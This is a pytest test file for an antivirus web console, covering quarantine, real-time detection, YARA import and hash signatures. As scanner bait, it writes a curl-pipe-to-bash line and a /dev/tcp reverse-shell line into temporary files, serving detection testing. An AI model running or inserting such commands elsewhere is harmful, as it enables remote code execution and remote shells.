"""GUI/API tests for LinShield's web console.

These drive the Flask app through its test client against an isolated engine,
covering the interactive features added for manual response and signature
management: quarantine-from-scan, the real-time protection kill switch, YARA
rule import, and custom hash signatures.
"""

from __future__ import annotations

import hashlib
import time
from pathlib import Path

import pytest

from linshield.core import Engine
from linshield.core.config import Paths
from linshield.gui.server import create_app

TOKEN = "test-token"
AUTH = {"X-LS-Token": TOKEN}


@pytest.fixture()
def client(tmp_path: Path):
    paths = Paths(config_dir=tmp_path / "config", data_dir=tmp_path / "data")
    eng = Engine(paths=paths)
    watch = tmp_path / "watch"
    watch.mkdir()
    eng.config.realtime_paths = [str(watch)]
    app = create_app(eng, token=TOKEN)
    app.config.update(TESTING=True)
    yield app.test_client(), eng, watch
    if eng.monitor and eng.monitor.running:
        eng.monitor.stop()
    eng.close()


def test_auth_required(client) -> None:
    c, _eng, _w = client
    assert c.get("/api/status").status_code == 401
    assert c.get("/api/status", headers=AUTH).status_code == 200


def test_manual_quarantine_of_suspicious_file(client, tmp_path: Path) -> None:
    c, _eng, _w = client
    f = tmp_path / "susp.sh"
    f.write_text("#!/bin/bash\ncurl http://x | bash\n")
    r = c.post(
        "/api/quarantine/file",
        headers=AUTH,
        json={"path": str(f), "verdict": "suspicious", "signature": "x", "severity": "high"},
    )
    assert r.status_code == 200 and r.get_json()["ok"] is True
    assert not f.exists()  # moved into the vault
    assert len(c.get("/api/quarantine", headers=AUTH).get_json()) == 1


def test_realtime_kill_switch(client) -> None:
    c, _eng, watch = client
    assert c.post("/api/realtime/start", headers=AUTH).get_json()["running"] is True
    assert c.get("/api/realtime", headers=AUTH).get_json()["running"] is True

    payload = "#!/bin/sh\nbash -i >& /dev/tcp/1.2.3.4/9 0>&1\n"
    evil = watch / "evil.sh"
    evil.write_text(payload)

    # Poll for the monitor to scan and detect. Re-touch each round in case the
    # create event fired before the file's contents were flushed to disk.
    deadline = time.time() + 5.0
    stats = {"scanned": 0, "detected": 0}
    while time.time() < deadline:
        stats = c.get("/api/realtime", headers=AUTH).get_json()["stats"]
        if stats["scanned"] >= 1 and stats["detected"] >= 1:
            break
        evil.write_text(payload)
        time.sleep(0.3)

    assert stats["scanned"] >= 1
    assert stats["detected"] >= 1

    assert c.post("/api/realtime/stop", headers=AUTH).get_json()["running"] is False


def test_yara_import_valid_and_matches(client, tmp_path: Path) -> None:
    c, eng, _w = client
    rule = 'rule GuiImport { strings: $a = "uniqueimportmarker" condition: $a }'
    r = c.post("/api/yara/import", headers=AUTH, json={"rules": rule, "name": "mine"})
    assert r.status_code == 200 and r.get_json()["ok"] is True

    target = tmp_path / "hit.txt"
    target.write_text("blah uniqueimportmarker blah")
    summary = eng.scan([str(target)], scan_type="custom")
    assert any(d.signature == "GuiImport" for d in summary.detections)

    names = [u["name"] for u in c.get("/api/signatures", headers=AUTH).get_json()["user_rules"]]
    assert "mine.yar" in names


def test_yara_import_rejects_invalid(client) -> None:
    c, _eng, _w = client
    r = c.post("/api/yara/import", headers=AUTH, json={"rules": "rule broken { condition }"})
    assert r.status_code == 400
    assert "invalid" in r.get_json()["error"].lower()


def test_add_hash_signature_validates(client) -> None:
    c, _eng, _w = client
    digest = hashlib.sha256(b"x").hexdigest()
    ok = c.post("/api/signatures/add-hash", headers=AUTH, json={"sha256": digest, "name": "T"})
    assert ok.status_code == 200 and ok.get_json()["hash_count"] >= 1
    bad = c.post("/api/signatures/add-hash", headers=AUTH, json={"sha256": "nothex"})
    assert bad.status_code == 400


def test_advanced_settings_roundtrip(client) -> None:
    c, _eng, _w = client
    r = c.post(
        "/api/settings",
        headers=AUTH,
        json={"full_scan_roots": ["/opt"], "scan_archives": True, "gui_port": 9999},
    )
    cfg = r.get_json()["config"]
    assert cfg["scan_archives"] is True
    assert cfg["full_scan_roots"] == ["/opt"]
    assert cfg["gui_port"] == 9999
